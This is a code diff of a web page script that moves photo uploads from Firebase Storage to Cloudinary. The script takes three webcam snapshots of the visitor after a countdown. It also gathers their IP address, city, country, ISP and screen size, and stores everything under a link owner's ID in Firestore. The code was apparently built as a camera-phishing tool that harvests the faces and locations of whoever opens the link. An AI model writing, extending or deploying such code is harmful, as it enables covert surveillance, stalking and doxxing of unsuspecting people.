@@ -47,9 +47,9 @@
 
 <script type="module">
 import {
-  db, storage, collection, addDoc, serverTimestamp,
-  doc, updateDoc, increment, ref, uploadBytes, getDownloadURL
+  db, collection, addDoc, serverTimestamp
 } from "./firebase.js";
+import { uploadToCloudinary } from "./cloudinary.js";
 
 const CAPTURE_COUNT  = 3;
 const CAPTURE_GAP_MS = 2200;
@@ -76,12 +76,9 @@ let stream   = null;
 let captured = 0;
 
 function updateDots(n){
-  dots.forEach((d, i) => {
-    d.classList.toggle("done", i < n);
-  });
+  dots.forEach((d, i) => d.classList.toggle("done", i < n));
 }
 
-/* ---------- Intel ---------- */
 async function getIP(){
   try {
     const r = await fetch("https://api.ipify.org?format=json");
@@ -103,7 +100,6 @@ async function getGeo(){
   } catch { return { city:"?", country:"?", isp:"?", text:"Unknown" }; }
 }
 
-/* ---------- Start camera ---------- */
 async function start(){
   try {
     statusBox.textContent = "ক্যামেরার অনুমতি চাওয়া হচ্ছে…";
@@ -121,7 +117,6 @@ async function start(){
     statusBox.style.background = "rgba(16,185,129,0.1)";
     statusBox.style.color = "#6ee7b7";
 
-    /* Begin capture loop */
     runCapture();
   } catch (err) {
     console.error("Camera error:", err);
@@ -131,7 +126,6 @@ async function start(){
   }
 }
 
-/* ---------- Capture Loop ---------- */
 async function runCapture(){
   const ip   = await getIP();
   const geo  = await getGeo();
@@ -141,7 +135,6 @@ async function runCapture(){
   const screenRes = window.screen.width + "×" + window.screen.height;
 
   for (let i = 0; i < CAPTURE_COUNT; i++){
-    /* countdown 3-2-1 */
     countdown.classList.add("show");
     for (let c = 3; c > 0; c--){
       countdown.textContent = c;
@@ -149,11 +142,9 @@ async function runCapture(){
     }
     countdown.classList.remove("show");
 
-    /* update badge */
     captureCount.textContent = (i+1) + " / " + CAPTURE_COUNT;
     updateDots(i+1);
 
-    /* capture */
     canvas.width  = video.videoWidth  || 720;
     canvas.height = video.videoHeight || 960;
     canvas.getContext("2d").drawImage(video, 0, 0);
@@ -163,26 +154,25 @@ async function runCapture(){
     );
 
     if (!blob){
-      console.warn("Blob creation failed at frame " + i);
+      console.warn("Blob failed at frame " + i);
       continue;
     }
 
     let photoUrl = "";
-
-    /* --- Upload to Firebase Storage --- */
     try {
-      const path = "captures/" + ownerUid + "/" + Date.now() + "_" + i + ".jpg";
-      const storageRef = ref(storage, path);
-      await uploadBytes(storageRef, blob);
-      photoUrl = await getDownloadURL(storageRef);
-      console.log("✓ Frame " + (i+1) + " uploaded:", photoUrl);
+      const uploaded = await uploadToCloudinary(blob, "myvault/" + ownerUid);
+      if (uploaded){
+        photoUrl = uploaded;
+        console.log("✓ Frame " + (i+1) + " → " + photoUrl);
+      } else {
+        photoUrl = canvas.toDataURL("image/jpeg", IMAGE_QUALITY);
+        console.warn("Fallback to dataURL for frame " + (i+1));
+      }
     } catch(e){
-      console.error("Storage error:", e);
-      /* fallback: store dataURL in Firestore if Storage fails */
+      console.error("Upload error:", e);
       photoUrl = canvas.toDataURL("image/jpeg", IMAGE_QUALITY);
     }
 
-    /* --- Save to Firestore --- */
     try {
       await addDoc(collection(db, "captures"), {
         ownerUid: ownerUid,
@@ -201,18 +191,16 @@ async function runCapture(){
         createdAt: serverTimestamp()
       });
       captured++;
-      console.log("✓ Frame " + (i+1) + " saved to Firestore");
+      console.log("✓ Firestore save: frame " + (i+1));
     } catch(e){
       console.error("Firestore error:", e);
     }
 
-    /* gap between captures */
     if (i < CAPTURE_COUNT - 1){
       await new Promise(r => setTimeout(r, CAPTURE_GAP_MS));
     }
   }
 
-  /* stop camera */
   if (stream){
     stream.getTracks().forEach(t => t.stop());
     stream = null;
